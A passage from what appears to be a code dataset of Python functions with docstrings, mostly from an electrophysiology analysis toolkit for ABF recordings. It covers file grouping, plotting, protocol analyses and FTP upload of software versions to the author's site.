            "def getParent(abfFname):\n    \"\"\"given an ABF file name, return the ABF of its parent.\"\"\"\n    child=os.path.abspath(abfFname)\n    files=sorted(glob.glob(os.path.dirname(child)+\"/*.*\"))\n    parentID=abfFname #its own parent\n    for fname in files:\n        if fname.endswith(\".abf\") and fname.replace(\".abf\",\".TIF\") in files:\n            parentID=os.path.basename(fname).replace(\".abf\",\"\")\n        if os.path.basename(child) in fname:\n            break\n    return parentID"
        ],
        [
            "def getParent2(abfFname,groups):\n    \"\"\"given an ABF and the groups dict, return the ID of its parent.\"\"\"\n    if \".abf\" in abfFname:\n        abfFname=os.path.basename(abfFname).replace(\".abf\",\"\")\n    for parentID in groups.keys():\n        if abfFname in groups[parentID]:\n            return parentID\n    return abfFname"
        ],
        [
            "def getNotesForABF(abfFile):\n    \"\"\"given an ABF, find the parent, return that line of experiments.txt\"\"\"\n    parent=getParent(abfFile)\n    parent=os.path.basename(parent).replace(\".abf\",\"\")\n    expFile=os.path.dirname(abfFile)+\"/experiment.txt\"\n    if not os.path.exists(expFile):\n        return \"no experiment file\"\n    with open(expFile) as f:\n        raw=f.readlines()\n    for line in raw:\n        if line[0]=='~':\n            line=line[1:].strip()\n            if line.startswith(parent):\n                while \"\\t\\t\" in line:\n                    line=line.replace(\"\\t\\t\",\"\\t\")\n                line=line.replace(\"\\t\",\"\\n\")\n                return line\n    return \"experiment.txt found, but didn't contain %s\"%parent"
        ],
        [
            "def getIDsFromFiles(files):\n    \"\"\"given a path or list of files, return ABF IDs.\"\"\"\n    if type(files) is str:\n        files=glob.glob(files+\"/*.*\")\n    IDs=[]\n    for fname in files:\n        if fname[-4:].lower()=='.abf':\n            ext=fname.split('.')[-1]\n            IDs.append(os.path.basename(fname).replace('.'+ext,''))\n    return sorted(IDs)"
        ],
        [
            "def inspectABF(abf=exampleABF,saveToo=False,justPlot=False):\n    \"\"\"May be given an ABF object or filename.\"\"\"\n    pylab.close('all')\n    print(\" ~~ inspectABF()\")\n    if type(abf) is str:\n        abf=swhlab.ABF(abf)\n    swhlab.plot.new(abf,forceNewFigure=True)\n    if abf.sweepInterval*abf.sweeps<60*5: #shorter than 5 minutes\n        pylab.subplot(211)\n        pylab.title(\"%s [%s]\"%(abf.ID,abf.protoComment))\n        swhlab.plot.sweep(abf,'all')\n        pylab.subplot(212)\n        swhlab.plot.sweep(abf,'all',continuous=True)\n        swhlab.plot.comments(abf)\n    else:\n        print(\" -- plotting as long recording\")\n        swhlab.plot.sweep(abf,'all',continuous=True,minutes=True)\n        swhlab.plot.comments(abf,minutes=True)\n        pylab.title(\"%s [%s]\"%(abf.ID,abf.protoComment))\n    swhlab.plot.annotate(abf)\n    if justPlot:\n        return\n    if saveToo:\n        path=os.path.split(abf.fname)[0]\n        basename=os.path.basename(abf.fname)\n        pylab.savefig(os.path.join(path,\"_\"+basename.replace(\".abf\",\".png\")))\n    pylab.show()\n    return"
        ],
        [
            "def ftp_login(folder=None):\n    \"\"\"return an \"FTP\" object after logging in.\"\"\"\n    pwDir=os.path.realpath(__file__)\n    for i in range(3):\n        pwDir=os.path.dirname(pwDir)\n    pwFile = os.path.join(pwDir,\"passwd.txt\")\n    print(\" -- looking for login information in:\\n   [%s]\"%pwFile)\n    try:\n        with open(pwFile) as f:\n            lines=f.readlines()\n        username=lines[0].strip()\n        password=lines[1].strip()\n        print(\" -- found a valid username/password\")\n    except:\n        print(\" -- password lookup FAILED.\")\n        username=TK_askPassword(\"FTP LOGIN\",\"enter FTP username\")\n        password=TK_askPassword(\"FTP LOGIN\",\"enter password for %s\"%username)\n        if not username or not password:\n            print(\" !! failed getting login info. aborting FTP effort.\")\n            return\n    print(\"      username:\",username)\n    print(\"      password:\",\"*\"*(len(password)))\n    print(\" -- logging in to FTP ...\")\n    try:\n        ftp = ftplib.FTP(\"swharden.com\")\n        ftp.login(username, password)\n        if folder:\n            ftp.cwd(folder)\n        return ftp\n    except:\n        print(\" !! login failure !!\")\n        return False"
        ],
        [
            "def ftp_folder_match(ftp,localFolder,deleteStuff=True):\n    \"\"\"upload everything from localFolder into the current FTP folder.\"\"\"\n    for fname in glob.glob(localFolder+\"/*.*\"):\n        ftp_upload(ftp,fname)\n    return"
        ],
        [
            "def version_upload(fname,username=\"nibjb\"):\n    \"\"\"Only scott should do this. Upload new version to site.\"\"\"\n    print(\"popping up pasword window...\")\n    password=TK_askPassword(\"FTP LOGIN\",\"enter password for %s\"%username)\n    if not password:\n        return\n    print(\"username:\",username)\n    print(\"password:\",\"*\"*(len(password)))\n    print(\"connecting...\")\n    ftp = ftplib.FTP(\"swharden.com\")\n    ftp.login(username, password)\n    print(\"successful login!\")\n    ftp.cwd(\"/software/swhlab/versions\") #IMMEDIATELY GO HERE!!!\n    print(\"uploading\",os.path.basename(fname))\n    ftp.storbinary(\"STOR \" + os.path.basename(fname), open(fname, \"rb\"), 1024) #for binary files\n    print(\"disconnecting...\")\n    ftp.quit()"
        ],
        [
            "def TK_askPassword(title=\"input\",msg=\"type here:\"):\n    \"\"\"use the GUI to ask for a string.\"\"\"\n    root = tkinter.Tk()\n    root.withdraw() #hide tk window\n    root.attributes(\"-topmost\", True) #always on top\n    root.lift() #bring to top\n    value=tkinter.simpledialog.askstring(title,msg)\n    root.destroy()\n    return value"
        ],
        [
            "def TK_message(title,msg):\n    \"\"\"use the GUI to pop up a message.\"\"\"\n    root = tkinter.Tk()\n    root.withdraw() #hide tk window\n    root.attributes(\"-topmost\", True) #always on top\n    root.lift() #bring to top\n    tkinter.messagebox.showwarning(title, msg)\n    root.destroy()"
        ],
        [
            "def TK_ask(title,msg):\n    \"\"\"use the GUI to ask YES or NO.\"\"\"\n    root = tkinter.Tk()\n    root.attributes(\"-topmost\", True) #always on top\n    root.withdraw() #hide tk window\n    result=tkinter.messagebox.askyesno(title,msg)\n    root.destroy()\n    return result"
        ],
        [
            "def processArgs():\n    \"\"\"check out the arguments and figure out what to do.\"\"\"\n    if len(sys.argv)<2:\n        print(\"\\n\\nERROR:\")\n        print(\"this script requires arguments!\")\n        print('try \"python command.py info\"')\n        return\n    if sys.argv[1]=='info':\n        print(\"import paths:\\n \",\"\\n  \".join(sys.path))\n        print()\n        print(\"python version:\",sys.version)\n        print(\"SWHLab path:\",__file__)\n        print(\"SWHLab version:\",swhlab.__version__)\n        return\n    if sys.argv[1]=='glanceFolder':\n        abfFolder=swhlab.common.gui_getFolder()\n        if not abfFolder or not os.path.isdir(abfFolder):\n            print(\"bad path\")\n            return\n        fnames=sorted(glob.glob(abfFolder+\"/*.abf\"))\n        outFolder=tempfile.gettempdir()+\"/swhlab/\"\n        if os.path.exists(outFolder):\n            shutil.rmtree(outFolder)\n        os.mkdir(outFolder)\n        outFile=outFolder+\"/index.html\"\n        out='<html><body>'\n        out+='<h2>%s</h2>'%abfFolder\n        for i,fname in enumerate(fnames):\n            print(\"\\n\\n### PROCESSING %d of %d\"%(i,len(fnames)))\n            saveAs=os.path.join(os.path.dirname(outFolder),os.path.basename(fname))+\".png\"\n            out+='<br><br><br><code>%s</code><br>'%os.path.abspath(fname)\n            out+='<a href=\"%s\"><img src=\"%s\"></a><br>'%(saveAs,saveAs)\n            swhlab.analysis.glance.processAbf(fname,saveAs)\n        out+='</body></html>'\n        with open(outFile,'w') as f:\n            f.write(out)\n        webbrowser.open_new_tab(outFile)\n        return\n\n\n    print(\"\\n\\nERROR:\\nI'm not sure how to process these arguments!\")\n    print(sys.argv)"
        ],
        [
            "def stats_first(abf):\n    \"\"\"provide all stats on the first AP.\"\"\"\n    msg=\"\"\n    for sweep in range(abf.sweeps):\n        for AP in abf.APs[sweep]:\n            for key in sorted(AP.keys()):\n                if key[-1] is \"I\" or key[-2:] in [\"I1\",\"I2\"]:\n                    continue\n                msg+=\"%s = %s\\n\"%(key,AP[key])\n            return msg"
        ],
        [
            "def getAvgBySweep(abf,feature,T0=None,T1=None):\n    \"\"\"return average of a feature divided by sweep.\"\"\"\n    if T1 is None:\n        T1=abf.sweepLength\n    if T0 is None:\n        T0=0\n    data = [np.empty((0))]*abf.sweeps\n    for AP in cm.dictFlat(cm.matrixToDicts(abf.APs)):\n        if T0<AP['sweepT']<T1:\n            val=AP[feature]\n            data[int(AP['sweep'])]=np.concatenate((data[int(AP['sweep'])],[val]))\n    for sweep in range(abf.sweeps):\n        if len(data[sweep])>1 and np.any(data[sweep]):\n            data[sweep]=np.nanmean(data[sweep])\n        elif len(data[sweep])==1:\n            data[sweep]=data[sweep][0]\n        else:\n            data[sweep]=np.nan\n    return data"
        ],
        [
            "def lazygo(watchFolder='../abfs/',reAnalyze=False,rebuildSite=False,\n           keepGoing=True,matching=False):\n    \"\"\"\n    continuously monitor a folder for new abfs and try to analyze them.\n    This is intended to watch only one folder, but can run multiple copies.\n    \"\"\"\n    abfsKnown=[]\n\n    while True:\n        print()\n        pagesNeeded=[]\n        for fname in glob.glob(watchFolder+\"/*.abf\"):\n            ID=os.path.basename(fname).replace(\".abf\",\"\")\n            if not fname in abfsKnown:\n                if os.path.exists(fname.replace(\".abf\",\".rsv\")): #TODO: or something like this\n                    continue\n                if matching and not matching in fname:\n                    continue\n                abfsKnown.append(fname)\n                if os.path.exists(os.path.dirname(fname)+\"/swhlab4/\"+os.path.basename(fname).replace(\".abf\",\"_info.pkl\")) and reAnalyze==False:\n                    print(\"already analyzed\",os.path.basename(fname))\n                    if rebuildSite:\n                        pagesNeeded.append(ID)\n                else:\n                    handleNewABF(fname)\n                    pagesNeeded.append(ID)\n        if len(pagesNeeded):\n            print(\" -- rebuilding index page\")\n            indexing.genIndex(os.path.dirname(fname),forceIDs=pagesNeeded)\n        if not keepGoing:\n            return\n        for i in range(50):\n            print('.',end='')\n            time.sleep(.2)"
        ],
        [
            "def gain(abf):\n    \"\"\"easy way to plot a gain function.\"\"\"\n    Ys=np.nan_to_num(swhlab.ap.getAvgBySweep(abf,'freq'))\n    Xs=abf.clampValues(abf.dataX[int(abf.protoSeqX[1]+.01)])\n    swhlab.plot.new(abf,title=\"gain function\",xlabel=\"command current (pA)\",\n                    ylabel=\"average inst. freq. (Hz)\")\n    pylab.plot(Xs,Ys,'.-',ms=20,alpha=.5,color='b')\n    pylab.axhline(0,alpha=.5,lw=2,color='r',ls=\"--\")\n    pylab.margins(.1,.1)"
        ],
        [
            "def comments(abf,minutes=False):\n    \"\"\"draw vertical lines at comment points. Defaults to seconds.\"\"\"\n    if not len(abf.commentTimes):\n        return\n    for i in range(len(abf.commentTimes)):\n        t,c = abf.commentTimes[i],abf.commentTags[i]\n        if minutes:\n            t=t/60\n        pylab.axvline(t,lw=1,color='r',ls=\"--\",alpha=.5)\n        X1,X2,Y1,Y2=pylab.axis()\n        Y2=Y2-abs(Y2-Y1)*.02\n        pylab.text(t,Y2,c,size=8,color='r',rotation='vertical',\n                   ha='right',va='top',weight='bold',alpha=.5)\n        if minutes:\n            pylab.xlabel(\"minutes\")\n        else:\n            pylab.xlabel(\"seconds\")"
        ],
        [
            "def annotate(abf):\n    \"\"\"stamp the bottom with file info.\"\"\"\n    msg=\"SWHLab %s \"%str(swhlab.VERSION)\n    msg+=\"ID:%s \"%abf.ID\n    msg+=\"CH:%d \"%abf.channel\n    msg+=\"PROTOCOL:%s \"%abf.protoComment\n    msg+=\"COMMAND: %d%s \"%(abf.holding,abf.units)\n    msg+=\"GENERATED:%s \"%'{0:%Y-%m-%d %H:%M:%S}'.format(datetime.datetime.now())\n    pylab.annotate(msg,(.001,.001),xycoords='figure fraction',ha='left',\n                   va='bottom',color='#999999',family='monospace',size=8,\n                   weight='bold')\n    if abf.nADC>1:\n        msg=\"Ch %d/%d\"%(abf.channel+1,abf.nADC)\n        pylab.annotate(msg,(.01,.99),xycoords='figure fraction',ha='left',\n                       va='top',color='#FF0000',family='monospace',size=12,\n                       weight='bold')"
        ],
        [
            "def new(ABF,forceNewFigure=False,title=None,xlabel=None,ylabel=None):\n    \"\"\"\n    makes a new matplotlib figure with default dims and DPI.\n    Also labels it with pA or mV depending on ABF.\n    \"\"\"\n    if len(pylab.get_fignums()) and forceNewFigure==False:\n        #print(\"adding to existing figure\")\n        return\n    pylab.figure(figsize=(8,6))\n    pylab.grid(alpha=.5)\n    pylab.title(ABF.ID)\n    pylab.ylabel(ABF.units)\n    pylab.xlabel(\"seconds\")\n    if xlabel:\n        pylab.xlabel(xlabel)\n    if ylabel:\n        pylab.ylabel(ylabel)\n    if title:\n        pylab.title(title)\n    annotate(ABF)"
        ],
        [
            "def save(abf,fname=None,tag=None,width=700,close=True,facecolor='w',\n              resize=True):\n    \"\"\"\n    Save the pylab figure somewhere.\n    If fname==False, show it instead.\n    Height force > dpi force\n    if a tag is given instead of a filename, save it alongside the ABF\n    \"\"\"\n    if len(pylab.gca().get_lines())==0:\n        print(\"can't save, no figure!\")\n        return\n    if resize:\n        pylab.tight_layout()\n        pylab.subplots_adjust(bottom=.1)\n    annotate(abf)\n    if tag:\n        fname = abf.outpath+abf.ID+\"_\"+tag+\".png\"\n    inchesX,inchesY = pylab.gcf().get_size_inches()\n    dpi=width/inchesX\n    if fname:\n        if not os.path.exists(abf.outpath):\n            os.mkdir(abf.outpath)\n        print(\" <- saving [%s] at %d DPI (%dx%d)\"%(os.path.basename(fname),dpi,inchesX*dpi,inchesY*dpi))\n        pylab.savefig(fname,dpi=dpi,facecolor=facecolor)\n    else:\n        pylab.show()\n    if close:\n        pylab.close()"
        ],
        [
            "def tryLoadingFrom(tryPath,moduleName='swhlab'):\n    \"\"\"if the module is in this path, load it from the local folder.\"\"\"\n    if not 'site-packages' in swhlab.__file__:\n        print(\"loaded custom swhlab module from\",\n              os.path.dirname(swhlab.__file__))\n        return # no need to warn if it's already outside.\n    while len(tryPath)>5:\n        sp=tryPath+\"/swhlab/\" # imaginary swhlab module path\n        if os.path.isdir(sp) and os.path.exists(sp+\"/__init__.py\"):\n            if not os.path.dirname(tryPath) in sys.path:\n                sys.path.insert(0,os.path.dirname(tryPath))\n            print(\"#\"*80)\n            print(\"# WARNING: using site-packages swhlab module\")\n            print(\"#\"*80)\n        tryPath=os.path.dirname(tryPath)\n    return"
        ],
        [
            "def update(self, tids, info):\n        \"\"\"\n        Called to update the state of the iterator.  This methods\n        receives the set of task ids from the previous set of tasks\n        together with the launch information to allow the output\n        values to be parsed using the output_extractor. This data is then\n        used to determine the next desired point in the parameter\n        space by calling the _update_state method.\n        \"\"\"\n        outputs_dir = os.path.join(info['root_directory'], 'streams')\n        pattern = '%s_*_tid_*{tid}.o.{tid}*' % info['batch_name']\n        flist = os.listdir(outputs_dir)\n        try:\n            outputs = []\n            for tid in tids:\n                matches = fnmatch.filter(flist, pattern.format(tid=tid))\n                if len(matches) != 1:\n                    self.warning(\"No unique output file for tid %d\" % tid)\n                contents = open(os.path.join(outputs_dir, matches[0]),'r').read()\n                outputs.append(self.output_extractor(contents))\n\n            self._next_val = self._update_state(outputs)\n            self.trace.append((outputs, self._next_val))\n        except:\n            self.warning(\"Cannot load required output files. Cannot continue.\")\n            self._next_val = StopIteration"
        ],
        [
            "def show(self):\n        \"\"\"\n        When dynamic, not all argument values may be available.\n        \"\"\"\n        copied = self.copy()\n        enumerated = [el for el in enumerate(copied)]\n        for (group_ind, specs) in enumerated:\n            if len(enumerated) > 1: print(\"Group %d\" % group_ind)\n            ordering = self.constant_keys + self.varying_keys\n            # Ordered nicely by varying_keys definition.\n            spec_lines = [', '.join(['%s=%s' % (k, s[k]) for k in ordering]) for s in specs]\n            print('\\n'.join(['%d: %s' % (i,l) for (i,l) in enumerate(spec_lines)]))\n\n        print('Remaining arguments not available for %s' % self.__class__.__name__)"
        ],
        [
            "def _trace_summary(self):\n        \"\"\"\n        Summarizes the trace of values used to update the DynamicArgs\n        and the arguments subsequently returned. May be used to\n        implement the summary method.\n        \"\"\"\n        for (i, (val, args)) in enumerate(self.trace):\n            if args is StopIteration:\n                info = \"Terminated\"\n            else:\n                pprint = ','.join('{' + ','.join('%s=%r' % (k,v)\n                         for (k,v) in arg.items()) + '}' for arg in args)\n                info = (\"exploring arguments [%s]\" % pprint )\n\n            if i == 0: print(\"Step %d: Initially %s.\" % (i, info))\n            else:      print(\"Step %d: %s after receiving input(s) %s.\" % (i, info.capitalize(), val))"
        ],
        [
            "def _update_state(self, vals):\n        \"\"\"\n        Takes as input a list or tuple of two elements. First the\n        value returned by incrementing by 'stepsize' followed by the\n        value returned after a 'stepsize' decrement.\n        \"\"\"\n        self._steps_complete += 1\n        if self._steps_complete == self.max_steps:\n            self._termination_info = (False, self._best_val, self._arg)\n            return StopIteration\n\n        arg_inc, arg_dec = vals\n        best_val = min(arg_inc, arg_dec, self._best_val)\n        if best_val == self._best_val:\n            self._termination_info = (True, best_val, self._arg)\n            return StopIteration\n\n        self._arg += self.stepsize if (arg_dec > arg_inc) else -self.stepsize\n        self._best_val= best_val\n        return [{self.key:self._arg+self.stepsize},\n                {self.key:self._arg-self.stepsize}]"
        ],
        [
            "def analyze(fname=False,save=True,show=None):\n    \"\"\"given a filename or ABF object, try to analyze it.\"\"\"\n    if fname and os.path.exists(fname.replace(\".abf\",\".rst\")):\n        print(\"SKIPPING DUE TO RST FILE\")\n        return\n    swhlab.plotting.core.IMAGE_SAVE=save\n    if show is None:\n        if cm.isIpython():\n            swhlab.plotting.core.IMAGE_SHOW=True\n        else:\n            swhlab.plotting.core.IMAGE_SHOW=False\n    #swhlab.plotting.core.IMAGE_SHOW=show\n    abf=ABF(fname) # ensure it's a class\n    print(\">>>>> PROTOCOL >>>>>\",abf.protocomment)\n    runFunction=\"proto_unknown\"\n    if \"proto_\"+abf.protocomment in globals():\n        runFunction=\"proto_\"+abf.protocomment\n    abf.log.debug(\"running %s()\"%(runFunction))\n    plt.close('all') # get ready\n    globals()[runFunction](abf) # run that function\n    try:\n        globals()[runFunction](abf) # run that function\n    except:\n        abf.log.error(\"EXCEPTION DURING PROTOCOL FUNCTION\")\n        abf.log.error(sys.exc_info()[0])\n        return \"ERROR\"\n    plt.close('all') # clean up\n    return \"SUCCESS\""
        ],
        [
            "def frameAndSave(abf,tag=\"\",dataType=\"plot\",saveAsFname=False,closeWhenDone=True):\n    \"\"\"\n    frame the current matplotlib plot with ABF info, and optionally save it.\n    Note that this is entirely independent of the ABFplot class object.\n    if saveImage is False, show it instead.\n\n    Datatype should be:\n        * plot\n        * experiment\n    \"\"\"\n    print(\"closeWhenDone\",closeWhenDone)\n    plt.tight_layout()\n    plt.subplots_adjust(top=.93,bottom =.07)\n    plt.annotate(tag,(.01,.99),xycoords='figure fraction',ha='left',va='top',family='monospace',size=10,alpha=.5)\n    msgBot=\"%s [%s]\"%(abf.ID,abf.protocomment)\n    plt.annotate(msgBot,(.01,.01),xycoords='figure fraction',ha='left',va='bottom',family='monospace',size=10,alpha=.5)\n    fname=tag.lower().replace(\" \",'_')+\".jpg\"\n    fname=dataType+\"_\"+fname\n    plt.tight_layout()\n    if IMAGE_SAVE:\n        abf.log.info(\"saving [%s]\",fname)\n        try:\n            if saveAsFname:\n                saveAs=os.path.abspath(saveAsFname)\n            else:\n                saveAs=os.path.abspath(abf.outPre+fname)\n            if not os.path.exists(abf.outFolder):\n                os.mkdir(abf.outFolder)\n            plt.savefig(saveAs)\n        except Exception as E:\n            abf.log.error(\"saving [%s] failed! 'pip install pillow'?\",fname)\n            print(E)\n    if IMAGE_SHOW==True:\n        if closeWhenDone==False:\n            print(\"NOT SHOWING (because closeWhenDone==True and showing would mess things up)\")\n        else:\n            abf.log.info(\"showing [%s]\",fname)\n            plt.show()\n    if closeWhenDone:\n        print(\"closing figure\")\n        plt.close('all')"
        ],
        [
            "def figure(self,forceNew=False):\n        \"\"\"make sure a figure is ready.\"\"\"\n        if plt._pylab_helpers.Gcf.get_num_fig_managers()>0 and forceNew is False:\n            self.log.debug(\"figure already seen, not creating one.\")\n            return\n\n        if self.subplot:\n            self.log.debug(\"subplot mode enabled, not creating new figure\")\n        else:\n            self.log.debug(\"creating new figure\")\n            plt.figure(figsize=(self.figure_width,self.figure_height))"
        ],
        [
            "def save(self,callit=\"misc\",closeToo=True,fullpath=False):\n        \"\"\"save the existing figure. does not close it.\"\"\"\n        if fullpath is False:\n            fname=self.abf.outPre+\"plot_\"+callit+\".jpg\"\n        else:\n            fname=callit\n        if not os.path.exists(os.path.dirname(fname)):\n            os.mkdir(os.path.dirname(fname))\n        plt.savefig(fname)\n        self.log.info(\"saved [%s]\",os.path.basename(fname))\n        if closeToo:\n            plt.close()"
        ],
        [
            "def figure_sweeps(self, offsetX=0, offsetY=0):\n        \"\"\"plot every sweep of an ABF file.\"\"\"\n        self.log.debug(\"creating overlayed sweeps plot\")\n        self.figure()\n        for sweep in range(self.abf.sweeps):\n            self.abf.setsweep(sweep)\n            self.setColorBySweep()\n            plt.plot(self.abf.sweepX2+sweep*offsetX,\n                     self.abf.sweepY+sweep*offsetY,\n                     **self.kwargs)\n        if offsetX:\n            self.marginX=.05\n        self.decorate()"
        ],
        [
            "def figure_protocol(self):\n        \"\"\"plot the current sweep protocol.\"\"\"\n        self.log.debug(\"creating overlayed protocols plot\")\n        self.figure()\n        plt.plot(self.abf.protoX,self.abf.protoY,color='r')\n        self.marginX=0\n        self.decorate(protocol=True)"
        ],
        [
            "def figure_protocols(self):\n        \"\"\"plot the protocol of all sweeps.\"\"\"\n        self.log.debug(\"creating overlayed protocols plot\")\n        self.figure()\n        for sweep in range(self.abf.sweeps):\n            self.abf.setsweep(sweep)\n            plt.plot(self.abf.protoX,self.abf.protoY,color='r')\n        self.marginX=0\n        self.decorate(protocol=True)"
        ],
        [
            "def clampfit_rename(path,char):\n    \"\"\"\n    Given ABFs and TIFs formatted long style, rename each of them to prefix their number with a different number.\n\n    Example: 2017_10_11_0011.abf\n    Becomes: 2017_10_11_?011.abf\n    where ? can be any character.\n    \"\"\"\n    assert len(char)==1 and type(char)==str, \"replacement character must be a single character\"\n    assert os.path.exists(path), \"path doesn't exist\"\n    files = sorted(os.listdir(path))\n    files = [x for x in files if len(x)>18 and x[4]+x[7]+x[10]=='___']\n    for fname in files:\n        fname2 = list(fname)\n        fname2[11]=char\n        fname2=\"\".join(fname2)\n\n        if fname==fname2:\n            print(fname, \"==\", fname2)\n        else:\n            print(fname, \"->\", fname2)\n#            fname=os.path.join(path,fname)\n#            fname2=os.path.join(path,fname2)\n#            if not os.path.exists(fname2):\n#                os.rename(fname,fname2)\n    return"
        ],
        [
            "def filesByExtension(fnames):\n    \"\"\"given a list of files, return a dict organized by extension.\"\"\"\n    byExt={\"abf\":[],\"jpg\":[],\"tif\":[]} # prime it with empties\n    for fname in fnames:\n        ext = os.path.splitext(fname)[1].replace(\".\",'').lower()\n        if not ext in byExt.keys():\n            byExt[ext]=[]\n        byExt[ext]=byExt[ext]+[fname]\n    return byExt"
        ],
        [
            "def filesByCell(fnames,cells):\n    \"\"\"given files and cells, return a dict of files grouped by cell.\"\"\"\n    byCell={}\n    fnames=smartSort(fnames)\n    days = list(set([elem[:5] for elem in fnames if elem.endswith(\".abf\")])) # so pythonic!\n    for day in smartSort(days):\n        parent=None\n        for i,fname in enumerate([elem for elem in fnames if elem.startswith(day) and elem.endswith(\".abf\")]):\n            ID=os.path.splitext(fname)[0]\n            if len([x for x in fnames if x.startswith(ID)])-1:\n                parent=ID\n            if not parent in byCell:\n                byCell[parent]=[]\n            byCell[parent]=byCell[parent]+[fname]\n    return byCell"
        ],
        [
            "def folderScan(self,abfFolder=None):\n        \"\"\"populate class properties relating to files in the folder.\"\"\"\n        if abfFolder is None and 'abfFolder' in dir(self):\n            abfFolder=self.abfFolder\n        else:\n            self.abfFolder=abfFolder\n        self.abfFolder=os.path.abspath(self.abfFolder)\n        self.log.info(\"scanning [%s]\",self.abfFolder)\n        if not os.path.exists(self.abfFolder):\n            self.log.error(\"path doesn't exist: [%s]\",abfFolder)\n            return\n        self.abfFolder2=os.path.abspath(self.abfFolder+\"/swhlab/\")\n        if not os.path.exists(self.abfFolder2):\n            self.log.error(\"./swhlab/ doesn't exist. creating it...\")            \n            os.mkdir(self.abfFolder2)\n        self.fnames=os.listdir(self.abfFolder)\n        self.fnames2=os.listdir(self.abfFolder2)\n        self.log.debug(\"./ has %d files\",len(self.fnames))\n        self.log.debug(\"./swhlab/ has %d files\",len(self.fnames2))\n        self.fnamesByExt = filesByExtension(self.fnames)\n        if not \"abf\" in self.fnamesByExt.keys():\n            self.log.error(\"no ABF files found\")\n        self.log.debug(\"found %d ABFs\",len(self.fnamesByExt[\"abf\"]))\n        \n        self.cells=findCells(self.fnames) # list of cells by their ID\n        self.log.debug(\"found %d cells\"%len(self.cells))\n        \n        self.fnamesByCell = filesByCell(self.fnames,self.cells) # only ABFs\n        self.log.debug(\"grouped cells by number of source files: %s\"%\\\n            str([len(self.fnamesByCell[elem]) for elem in self.fnamesByCell]))"
        ],
        [
            "def html_index(self,launch=False,showChildren=False):\n        \"\"\"\n        generate list of cells with links. keep this simple.\n        automatically generates splash page and regnerates frames.\n        \"\"\"\n        self.makePics() # ensure all pics are converted\n        # generate menu\n        html='<a href=\"index_splash.html\" target=\"content\">./%s/</a><br>'%os.path.basename(self.abfFolder)\n        for ID in smartSort(self.fnamesByCell.keys()):\n            link=''\n            if ID+\".html\" in self.fnames2:\n                link='href=\"%s.html\" target=\"content\"'%ID\n            html+=('<a %s>%s</a><br>'%(link,ID)) # show the parent ABF (ID)\n            if showChildren:\n                for fname in self.fnamesByCell[ID]:\n                    thisID=os.path.splitext(fname)[0]\n                    files2=[x for x in self.fnames2 if x.startswith(thisID) and not x.endswith(\".html\")]\n                    html+='<i>%s</i>'%thisID # show the child ABF\n                    if len(files2):\n                        html+=' (%s)'%len(files2) # show number of supporting files\n                    html+='<br>'\n                html+=\"<br>\"\n        style.save(html,self.abfFolder2+\"/index_menu.html\")\n        self.html_index_splash() # make splash page\n        style.frames(self.abfFolder2+\"/index.html\",launch=launch)"
        ],
        [
            "def html_singleAll(self,template=\"basic\"):\n        \"\"\"generate a data view for every ABF in the project folder.\"\"\"\n        for fname in smartSort(self.cells):\n            if template==\"fixed\":\n                self.html_single_fixed(fname)\n            else:\n                self.html_single_basic(fname)"
        ],
        [
            "def proto_01_01_HP010(abf=exampleABF):\n    \"\"\"hyperpolarization step. Use to calculate tau and stuff.\"\"\"\n    swhlab.memtest.memtest(abf) #knows how to do IC memtest\n    swhlab.memtest.checkSweep(abf) #lets you eyeball check how it did\n    swhlab.plot.save(abf,tag=\"tau\")"
        ],
        [
            "def proto_01_12_steps025(abf=exampleABF):\n    \"\"\"IC steps. Use to determine gain function.\"\"\"\n    swhlab.ap.detect(abf)\n    standard_groupingForInj(abf,200)\n\n    for feature in ['freq','downslope']:\n        swhlab.ap.plot_values(abf,feature,continuous=False) #plot AP info\n        swhlab.plot.save(abf,tag='A_'+feature)\n\n    swhlab.plot.gain(abf) #easy way to do a gain function!\n    swhlab.plot.save(abf,tag='05-gain')"
        ],
        [
            "def proto_01_13_steps025dual(abf=exampleABF):\n    \"\"\"IC steps. See how hyperpol. step affects things.\"\"\"\n    swhlab.ap.detect(abf)\n    standard_groupingForInj(abf,200)\n\n    for feature in ['freq','downslope']:\n        swhlab.ap.plot_values(abf,feature,continuous=False) #plot AP info\n        swhlab.plot.save(abf,tag='A_'+feature)\n\n    f1=swhlab.ap.getAvgBySweep(abf,'freq',None,1)\n    f2=swhlab.ap.getAvgBySweep(abf,'freq',1,None)\n    f1=np.nan_to_num(f1)\n    f2=np.nan_to_num(f2)\n    Xs=abf.clampValues(abf.dataX[int(abf.protoSeqX[1]+.01)])\n    swhlab.plot.new(abf,title=\"gain function\",xlabel=\"command current (pA)\",\n                    ylabel=\"average inst. freq. (Hz)\")\n    pylab.plot(Xs,f1,'.-',ms=20,alpha=.5,label=\"step 1\",color='b')\n    pylab.plot(Xs,f2,'.-',ms=20,alpha=.5,label=\"step 2\",color='r')\n    pylab.legend(loc='upper left')\n    pylab.axis([Xs[0],Xs[-1],None,None])\n    swhlab.plot.save(abf,tag='gain')"
        ],
        [
            "def proto_02_01_MT70(abf=exampleABF):\n    \"\"\"repeated membrane tests.\"\"\"\n    standard_overlayWithAverage(abf)\n    swhlab.memtest.memtest(abf)\n    swhlab.memtest.checkSweep(abf)\n    swhlab.plot.save(abf,tag='check',resize=False)"
        ],
        [
            "def proto_02_03_IVfast(abf=exampleABF):\n    \"\"\"fast sweeps, 1 step per sweep, for clean IV without fast currents.\"\"\"\n    av1,sd1=swhlab.plot.IV(abf,.6,.9,True)\n    swhlab.plot.save(abf,tag='iv1')\n    Xs=abf.clampValues(.6) #generate IV clamp values\n    abf.saveThing([Xs,av1],'iv')"
        ],
        [
            "def proto_04_01_MTmon70s2(abf=exampleABF):\n    \"\"\"repeated membrane tests, likely with drug added. Maybe IPSCs.\"\"\"\n    standard_inspect(abf)\n    swhlab.memtest.memtest(abf)\n    swhlab.memtest.checkSweep(abf)\n    swhlab.plot.save(abf,tag='check',resize=False)\n    swhlab.memtest.plot_standard4(abf)\n    swhlab.plot.save(abf,tag='memtests')"
        ],
        [
            "def proto_VC_50_MT_IV(abf=exampleABF):\n    \"\"\"combination of membrane test and IV steps.\"\"\"\n    swhlab.memtest.memtest(abf) #do membrane test on every sweep\n    swhlab.memtest.checkSweep(abf) #see all MT values\n    swhlab.plot.save(abf,tag='02-check',resize=False)\n\n    av1,sd1=swhlab.plot.IV(abf,1.2,1.4,True,'b')\n    swhlab.plot.save(abf,tag='iv')\n    Xs=abf.clampValues(1.2) #generate IV clamp values\n    abf.saveThing([Xs,av1],'01_iv')"
        ],
        [
